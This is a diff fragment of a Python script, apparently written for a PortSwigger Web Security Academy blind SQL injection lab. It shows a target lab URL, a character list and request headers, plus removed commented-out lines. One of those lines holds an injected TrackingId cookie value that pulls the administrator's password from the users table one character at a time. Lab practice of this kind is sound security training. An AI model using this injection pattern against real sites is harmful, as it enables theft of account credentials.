@@ -2,18 +2,12 @@ import requests
 
 # URL a la que se realizará la solicitud
 url = "https://0afc006803e4bc4780b80d6400a40044.web-security-academy.net/filter?category=Toys+%26+Games"
- # Puedes cambiar este valor a la letra que quieras probar
+ 
 chars = [
     'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
     '0', '1', '2', '3', '4', '5', '6', '7', '8', '9'
 ]
-#n=1
-# Crear la consulta SQL inyectada
-#tracking_id = f"bODfna3mB4soHqcW' AND (SELECT SUBSTRING(password,{n},1) FROM users WHERE username='administrator')='{chars[24]}"
-# Definir las cookies con inyeccion
 
-
-# Definir las cabeceras
 headers = {
     'Sec-Ch-Ua': '"Chromium";v="129", "Not=A?Brand";v="8"',
     'Sec-Ch-Ua-Mobile': '?0',
